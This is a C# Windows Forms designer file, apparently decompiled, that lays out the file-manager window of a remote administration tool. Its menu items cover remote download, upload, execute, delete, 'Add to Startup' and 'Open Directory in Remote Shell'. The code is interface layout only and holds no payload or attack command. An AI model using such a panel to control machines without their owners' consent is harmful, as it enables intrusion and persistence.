using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using InvokedServer.Controls;
using InvokedServer.Properties;
using InvokedServer.Utilities;

namespace InvokedServer.Forms
{
    partial class FrmFileManager
    {
        private IContainer components;

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = (IContainer)new System.ComponentModel.Container();
            ComponentResourceManager resources = new ComponentResourceManager(typeof(FrmFileManager));
            ListViewColumnSorter viewColumnSorter1 = new ListViewColumnSorter();
            ListViewColumnSorter viewColumnSorter2 = new ListViewColumnSorter();
            this.contextMenuStripDirectory = new ContextMenuStrip(this.components);
            this.downloadToolStripMenuItem = new ToolStripMenuItem();
            this.uploadToolStripMenuItem = new ToolStripMenuItem();
            this.lineToolStripMenuItem = new ToolStripSeparator();
            this.executeToolStripMenuItem = new ToolStripMenuItem();
            this.renameToolStripMenuItem = new ToolStripMenuItem();
            this.deleteToolStripMenuItem = new ToolStripMenuItem();
            this.line2ToolStripMenuItem = new ToolStripSeparator();
            this.addToStartupToolStripMenuItem = new ToolStripMenuItem();
            this.line3ToolStripMenuItem = new ToolStripSeparator();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.openDirectoryInShellToolStripMenuItem = new ToolStripMenuItem();
            this.imgListDirectory = new ImageList(this.components);
            this.statusStrip = new StatusStrip();
            this.stripLblStatus = new ToolStripStatusLabel();
            this.contextMenuStripTransfers = new ContextMenuStrip(this.components);
            this.cancelToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripMenuItem1 = new ToolStripSeparator();
            this.clearToolStripMenuItem = new ToolStripMenuItem();
            this.imgListTransfers = new ImageList(this.components);
            this.TabControlFileManager = new DotNetBarTabControl();
            this.tabFileExplorer = new TabPage();
            this.btnRefresh = new Button();
            this.lblPath = new Label();
            this.txtPath = new TextBox();
            this.lstDirectory = new AeroListView();
            this.hName = new ColumnHeader();
            this.hSize = new ColumnHeader();
            this.hType = new ColumnHeader();
            this.lblDrive = new Label();
            this.cmbDrives = new ComboBox();
            this.tabTransfers = new TabPage();
            this.btnOpenDLFolder = new Button();
            this.lstTransfers = new AeroListView();
            this.hID = new ColumnHeader();
            this.hTransferType = new ColumnHeader();
            this.hStatus = new ColumnHeader();
            this.hFilename = new ColumnHeader();
            this.contextMenuStripDirectory.SuspendLayout();
            this.statusStrip.SuspendLayout();
            this.contextMenuStripTransfers.SuspendLayout();
            this.TabControlFileManager.SuspendLayout();
            this.tabFileExplorer.SuspendLayout();
            this.tabTransfers.SuspendLayout();
            this.SuspendLayout();
            this.contextMenuStripDirectory.Items.AddRange(new ToolStripItem[11]
            {
                (ToolStripItem) this.downloadToolStripMenuItem,
                (ToolStripItem) this.uploadToolStripMenuItem,
                (ToolStripItem) this.lineToolStripMenuItem,
                (ToolStripItem) this.executeToolStripMenuItem,
                (ToolStripItem) this.renameToolStripMenuItem,
                (ToolStripItem) this.deleteToolStripMenuItem,
                (ToolStripItem) this.line2ToolStripMenuItem,
                (ToolStripItem) this.addToStartupToolStripMenuItem,
                (ToolStripItem) this.line3ToolStripMenuItem,
                (ToolStripItem) this.refreshToolStripMenuItem,
                (ToolStripItem) this.openDirectoryInShellToolStripMenuItem
            });
            this.contextMenuStripDirectory.Name = "ctxtMenu";
            this.contextMenuStripDirectory.Size = new Size(240, 198);
            this.downloadToolStripMenuItem.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte)0);
            this.downloadToolStripMenuItem.Image = (Image)resources.GetObject("downloadToolStripMenuItem.Image");
            this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
            this.downloadToolStripMenuItem.Size = new Size(239, 22);
            this.downloadToolStripMenuItem.Text = "Download";
            this.downloadToolStripMenuItem.Click += new EventHandler(this.downloadToolStripMenuItem_Click);
            this.uploadToolStripMenuItem.Image = (Image)resources.GetObject("uploadToolStripMenuItem.Image");
            this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
            this.uploadToolStripMenuItem.Size = new Size(239, 22);
            this.uploadToolStripMenuItem.Text = "Upload";
            this.uploadToolStripMenuItem.Click += new EventHandler(this.uploadToolStripMenuItem_Click);
            this.lineToolStripMenuItem.Name = "lineToolStripMenuItem";
            this.lineToolStripMenuItem.Size = new Size(236, 6);
            this.executeToolStripMenuItem.Image = (Image)resources.GetObject("executeToolStripMenuItem.Image");
            this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
            this.executeToolStripMenuItem.Size = new Size(239, 22);
            this.executeToolStripMenuItem.Text = "Execute";
            this.executeToolStripMenuItem.Click += new EventHandler(this.executeToolStripMenuItem_Click);
            this.renameToolStripMenuItem.Image = (Image)Resources.textfield_rename;
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new Size(239, 22);
            this.renameToolStripMenuItem.Text = "Rename";
            this.renameToolStripMenuItem.Click += new EventHandler(this.renameToolStripMenuItem_Click);
            this.deleteToolStripMenuItem.Image = (Image)Resources.delete;
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new Size(239, 22);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new EventHandler(this.deleteToolStripMenuItem_Click);
            this.line2ToolStripMenuItem.Name = "line2ToolStripMenuItem";
            this.line2ToolStripMenuItem.Size = new Size(236, 6);
            this.addToStartupToolStripMenuItem.Image = (Image)Resources.application_add;
            this.addToStartupToolStripMenuItem.Name = "addToStartupToolStripMenuItem";
            this.addToStartupToolStripMenuItem.Size = new Size(239, 22);
            this.addToStartupToolStripMenuItem.Text = "Add to Startup";
            this.addToStartupToolStripMenuItem.Click += new EventHandler(this.addToStartupToolStripMenuItem_Click);
            this.line3ToolStripMenuItem.Name = "line3ToolStripMenuItem";
            this.line3ToolStripMenuItem.Size = new Size(236, 6);
            this.refreshToolStripMenuItem.Image = (Image)Resources.refresh;
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(239, 22);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
            this.openDirectoryInShellToolStripMenuItem.Image = (Image)Resources.terminal;
            this.openDirectoryInShellToolStripMenuItem.Name = "openDirectoryInShellToolStripMenuItem";
            this.openDirectoryInShellToolStripMenuItem.Size = new Size(239, 22);
            this.openDirectoryInShellToolStripMenuItem.Text = "Open Directory in Remote Shell";
            this.openDirectoryInShellToolStripMenuItem.Click += new EventHandler(this.openDirectoryToolStripMenuItem_Click);
            this.imgListDirectory.ImageStream = (ImageListStreamer)resources.GetObject("imgListDirectory.ImageStream");
            this.imgListDirectory.TransparentColor = Color.Transparent;
            this.imgListDirectory.Images.SetKeyName(0, "back.png");
            this.imgListDirectory.Images.SetKeyName(1, "folder.png");
            this.imgListDirectory.Images.SetKeyName(2, "file.png");
            this.imgListDirectory.Images.SetKeyName(3, "application.png");
            this.imgListDirectory.Images.SetKeyName(4, "text.png");
            this.imgListDirectory.Images.SetKeyName(5, "archive.png");
            this.imgListDirectory.Images.SetKeyName(6, "word.png");
            this.imgListDirectory.Images.SetKeyName(7, "pdf.png");
            this.imgListDirectory.Images.SetKeyName(8, "image.png");
            this.imgListDirectory.Images.SetKeyName(9, "movie.png");
            this.imgListDirectory.Images.SetKeyName(10, "music.png");
            this.statusStrip.Items.AddRange(new ToolStripItem[1]
            {
                (ToolStripItem) this.stripLblStatus
            });
            this.statusStrip.Location = new Point(0, 456);
            this.statusStrip.Name = "statusStrip";
            this.statusStrip.Size = new Size(858, 22);
            this.statusStrip.TabIndex = 3;
            this.statusStrip.Text = "statusStrip1";
            this.stripLblStatus.Name = "stripLblStatus";
            this.stripLblStatus.Size = new Size(131, 17);
            this.stripLblStatus.Text = "Status: Loading drives...";
            this.contextMenuStripTransfers.Items.AddRange(new ToolStripItem[3]
            {
                (ToolStripItem) this.cancelToolStripMenuItem,
                (ToolStripItem) this.toolStripMenuItem1,
                (ToolStripItem) this.clearToolStripMenuItem
            });
            this.contextMenuStripTransfers.Name = "ctxtMenu2";
            this.contextMenuStripTransfers.Size = new Size(150, 54);
            this.cancelToolStripMenuItem.Image = (Image)Resources.cancel;
            this.cancelToolStripMenuItem.Name = "cancelToolStripMenuItem";
            this.cancelToolStripMenuItem.Size = new Size(149, 22);
            this.cancelToolStripMenuItem.Text = "Cancel";
            this.cancelToolStripMenuItem.Click += new EventHandler(this.cancelToolStripMenuItem_Click);
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new Size(146, 6);
            this.clearToolStripMenuItem.Image = (Image)Resources.broom;
            this.clearToolStripMenuItem.Name = "clearToolStripMenuItem";
            this.clearToolStripMenuItem.Size = new Size(149, 22);
            this.clearToolStripMenuItem.Text = "Clear transfers";
            this.clearToolStripMenuItem.Click += new EventHandler(this.clearToolStripMenuItem_Click);
            this.imgListTransfers.ImageStream = (ImageListStreamer)resources.GetObject("imgListTransfers.ImageStream");
            this.imgListTransfers.TransparentColor = Color.Transparent;
            this.imgListTransfers.Images.SetKeyName(0, "cancel.png");
            this.imgListTransfers.Images.SetKeyName(1, "done.png");
            this.TabControlFileManager.Alignment = TabAlignment.Left;
            this.TabControlFileManager.Controls.Add((Control)this.tabFileExplorer);
            this.TabControlFileManager.Controls.Add((Control)this.tabTransfers);
            this.TabControlFileManager.Dock = DockStyle.Fill;
            this.TabControlFileManager.ItemSize = new Size(44, 136);
            this.TabControlFileManager.Location = new Point(0, 0);
            this.TabControlFileManager.Multiline = true;
            this.TabControlFileManager.Name = "TabControlFileManager";
            this.TabControlFileManager.SelectedIndex = 0;
            this.TabControlFileManager.Size = new Size(858, 456);
            this.TabControlFileManager.SizeMode = TabSizeMode.Fixed;
            this.TabControlFileManager.TabIndex = 5;
            this.tabFileExplorer.BackColor = SystemColors.Control;
            this.tabFileExplorer.Controls.Add((Control)this.btnRefresh);
            this.tabFileExplorer.Controls.Add((Control)this.lblPath);
            this.tabFileExplorer.Controls.Add((Control)this.txtPath);
            this.tabFileExplorer.Controls.Add((Control)this.lstDirectory);
            this.tabFileExplorer.Controls.Add((Control)this.lblDrive);
            this.tabFileExplorer.Controls.Add((Control)this.cmbDrives);
            this.tabFileExplorer.Location = new Point(140, 4);
            this.tabFileExplorer.Name = "tabFileExplorer";
            this.tabFileExplorer.Padding = new Padding(3);
            this.tabFileExplorer.Size = new Size(714, 448);
            this.tabFileExplorer.TabIndex = 0;
            this.tabFileExplorer.Text = "File Explorer";
            this.btnRefresh.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.btnRefresh.FlatStyle = FlatStyle.Popup;
            this.btnRefresh.Image = (Image)Resources.refresh;
            this.btnRefresh.ImageAlign = ContentAlignment.BottomCenter;
            this.btnRefresh.Location = new Point(682, 8);
            this.btnRefresh.Name = "btnRefresh";
            this.btnRefresh.Size = new Size(22, 22);
            this.btnRefresh.TabIndex = 5;
            this.btnRefresh.UseVisualStyleBackColor = true;
            this.btnRefresh.Click += new EventHandler(this.btnRefresh_Click);
            this.lblPath.AutoSize = true;
            this.lblPath.Location = new Point(279, 12);
            this.lblPath.Name = "lblPath";
            this.lblPath.Size = new Size(75, 13);
            this.lblPath.TabIndex = 4;
            this.lblPath.Text = "Remote Path:";
            this.txtPath.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            this.txtPath.BorderStyle = BorderStyle.FixedSingle;
            this.txtPath.Location = new Point(360, 8);
            this.txtPath.Name = "txtPath";
            this.txtPath.ReadOnly = true;
            this.txtPath.Size = new Size(323, 22);
            this.txtPath.TabIndex = 3;
            this.txtPath.Text = "\\";
            this.lstDirectory.AllowDrop = true;
            this.lstDirectory.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            this.lstDirectory.Columns.AddRange(new ColumnHeader[3]
            {
                this.hName,
                this.hSize,
                this.hType
            });
            this.lstDirectory.ContextMenuStrip = this.contextMenuStripDirectory;
            this.lstDirectory.FullRowSelect = true;
            this.lstDirectory.GridLines = true;
            this.lstDirectory.HideSelection = false;
            this.lstDirectory.Location = new Point(8, 35);
            viewColumnSorter1.NeedNumberCompare = false;
            viewColumnSorter1.Order = SortOrder.None;
            viewColumnSorter1.SortColumn = 0;
            this.lstDirectory.LvwColumnSorter = viewColumnSorter1;
            this.lstDirectory.Name = "lstDirectory";
            this.lstDirectory.Size = new Size(700, 406);
            this.lstDirectory.SmallImageList = this.imgListDirectory;
            this.lstDirectory.TabIndex = 2;
            this.lstDirectory.UseCompatibleStateImageBehavior = false;
            this.lstDirectory.View = View.Details;
            this.lstDirectory.ColumnClick += new ColumnClickEventHandler(this.lstDirectory_ColumnClick);
            this.lstDirectory.DragDrop += new DragEventHandler(this.lstDirectory_DragDrop);
            this.lstDirectory.DragEnter += new DragEventHandler(this.lstDirectory_DragEnter);
            this.lstDirectory.DoubleClick += new EventHandler(this.lstDirectory_DoubleClick);
            this.hName.Text = "Name";
            this.hName.Width = 360;
            this.hSize.Text = "Size";
            this.hSize.Width = 125;
            this.hType.Text = "Type";
            this.hType.Width = 168;
            this.lblDrive.AutoSize = true;
            this.lblDrive.Location = new Point(8, 12);
            this.lblDrive.Name = "lblDrive";
            this.lblDrive.Size = new Size(36, 13);
            this.lblDrive.TabIndex = 0;
            this.lblDrive.Text = "Drive:";
            this.cmbDrives.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbDrives.FormattingEnabled = true;
            this.cmbDrives.Location = new Point(50, 8);
            this.cmbDrives.Name = "cmbDrives";
            this.cmbDrives.Size = new Size(212, 21);
            this.cmbDrives.TabIndex = 1;
            this.cmbDrives.SelectedIndexChanged += new EventHandler(this.cmbDrives_SelectedIndexChanged);
            this.tabTransfers.BackColor = SystemColors.Control;
            this.tabTransfers.Controls.Add((Control)this.btnOpenDLFolder);
            this.tabTransfers.Controls.Add((Control)this.lstTransfers);
            this.tabTransfers.Location = new Point(140, 4);
            this.tabTransfers.Name = "tabTransfers";
            this.tabTransfers.Padding = new Padding(3);
            this.tabTransfers.Size = new Size(714, 448);
            this.tabTransfers.TabIndex = 1;
            this.tabTransfers.Text = "Transfers";
            this.btnOpenDLFolder.Location = new Point(8, 8);
            this.btnOpenDLFolder.Name = "btnOpenDLFolder";
            this.btnOpenDLFolder.Size = new Size(145, 21);
            this.btnOpenDLFolder.TabIndex = 0;
            this.btnOpenDLFolder.Text = "&Open Download Folder";
            this.btnOpenDLFolder.UseVisualStyleBackColor = true;
            this.btnOpenDLFolder.Click += new EventHandler(this.btnOpenDLFolder_Click);
            this.lstTransfers.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            this.lstTransfers.Columns.AddRange(new ColumnHeader[4]
            {
                this.hID,
                this.hTransferType,
                this.hStatus,
                this.hFilename
            });
            this.lstTransfers.ContextMenuStrip = this.contextMenuStripTransfers;
            this.lstTransfers.FullRowSelect = true;
            this.lstTransfers.GridLines = true;
            this.lstTransfers.HideSelection = false;
            this.lstTransfers.Location = new Point(8, 35);
            viewColumnSorter2.NeedNumberCompare = false;
            viewColumnSorter2.Order = SortOrder.None;
            viewColumnSorter2.SortColumn = 0;
            this.lstTransfers.LvwColumnSorter = viewColumnSorter2;
            this.lstTransfers.Name = "lstTransfers";
            this.lstTransfers.Size = new Size(698, 407);
            this.lstTransfers.SmallImageList = this.imgListTransfers;
            this.lstTransfers.TabIndex = 1;
            this.lstTransfers.UseCompatibleStateImageBehavior = false;
            this.lstTransfers.View = View.Details;
            this.hID.Text = "ID";
            this.hID.Width = 128;
            this.hTransferType.Text = "Transfer Type";
            this.hTransferType.Width = 93;
            this.hStatus.Text = "Status";
            this.hStatus.Width = 173;
            this.hFilename.Text = "Filename";
            this.hFilename.Width = 289;
            this.AutoScaleDimensions = new SizeF(96f, 96f);
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.ClientSize = new Size(858, 478);
            this.Controls.Add((Control)this.TabControlFileManager);
            this.Controls.Add((Control)this.statusStrip);
            this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte)0);
            this.Icon = (Icon)resources.GetObject("$this.Icon");
            this.KeyPreview = true;
            this.MinimumSize = new Size(663, 377);
            this.Name = "FrmFileManager";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "File Manager []";
            this.FormClosing += new FormClosingEventHandler(this.FrmFileManager_FormClosing);
            this.Load += new EventHandler(this.FrmFileManager_Load);
            this.KeyDown += new KeyEventHandler(this.FrmFileManager_KeyDown);
            this.contextMenuStripDirectory.ResumeLayout(false);
            this.statusStrip.ResumeLayout(false);
            this.statusStrip.PerformLayout();
            this.contextMenuStripTransfers.ResumeLayout(false);
            this.TabControlFileManager.ResumeLayout(false);
            this.tabFileExplorer.ResumeLayout(false);
            this.tabFileExplorer.PerformLayout();
            this.tabTransfers.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private Label lblDrive;
        private ImageList imgListDirectory;
        private ColumnHeader hName;
        private ColumnHeader hSize;
        private ColumnHeader hType;
        private ContextMenuStrip contextMenuStripDirectory;
        private ToolStripMenuItem downloadToolStripMenuItem;
        private Button btnOpenDLFolder;
        private DotNetBarTabControl TabControlFileManager;
        private TabPage tabFileExplorer;
        private TabPage tabTransfers;
        private ColumnHeader hStatus;
        private ColumnHeader hFilename;
        private ColumnHeader hID;
        private ImageList imgListTransfers;
        private ToolStripMenuItem executeToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private ToolStripSeparator line3ToolStripMenuItem;
        private ToolStripSeparator lineToolStripMenuItem;
        private ToolStripMenuItem renameToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ToolStripSeparator line2ToolStripMenuItem;
        private ToolStripMenuItem addToStartupToolStripMenuItem;
        private ContextMenuStrip contextMenuStripTransfers;
        private ToolStripMenuItem cancelToolStripMenuItem;
        private ToolStripMenuItem openDirectoryInShellToolStripMenuItem;
        private ComboBox cmbDrives;
        private AeroListView lstDirectory;
        private AeroListView lstTransfers;
        private StatusStrip statusStrip;
        private ToolStripMenuItem clearToolStripMenuItem;
        private ToolStripStatusLabel stripLblStatus;
        private Label lblPath;
        private TextBox txtPath;
        private Button btnRefresh;
        private ToolStripMenuItem uploadToolStripMenuItem;
        private ColumnHeader hTransferType;
        private ToolStripSeparator toolStripMenuItem1;
    }
}
